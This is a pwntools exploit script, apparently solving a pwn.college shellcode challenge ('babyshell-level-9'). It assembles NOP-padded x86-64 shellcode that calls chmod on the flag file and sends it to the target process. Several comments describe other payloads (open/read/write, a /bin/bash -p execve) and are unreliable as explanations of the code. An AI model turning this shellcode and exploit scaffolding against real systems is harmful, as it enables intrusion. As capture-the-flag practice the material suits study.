from pwn import *
from grwnapy.pwn import find_offset

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = '/challenge/babyshell-level-9'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'

# ===========================================================
#                           EXPLOIT
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# offset = find_offset(exe, cyclic(500))
# win = elf.symbols['win']
# opens flag, opens result flag (using WRONLY flag)
# then read falg, write to result flag
# rsi holds FLAGS
# rdx holds Permissions
# rsp holds buffer for read
assembly = """
    push 0x67616c66
    push rsp
    pop rdi 
    jmp chunk2
    nop
    nop
    nop

    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
chunk2:
    push 6
    pop rsi
    push 90
    pop rax
    syscall
    """

# Walkthrough of shellcode
# First, push /bin/bash using several techniques.
# Then nullify rdx and rax
# After that, put '-p' into rsi
# Then, push the 'array' ["/bin/bash", "-p", 0], keep in mind that rsi and rdi holds pointers.
# Then do syscall

shellcode = asm(assembly)
print(shellcode)

io = start()

payload = flat([shellcode])

io.sendlineafter(b'', payload)
io.recvuntil(b'')

io.interactive()
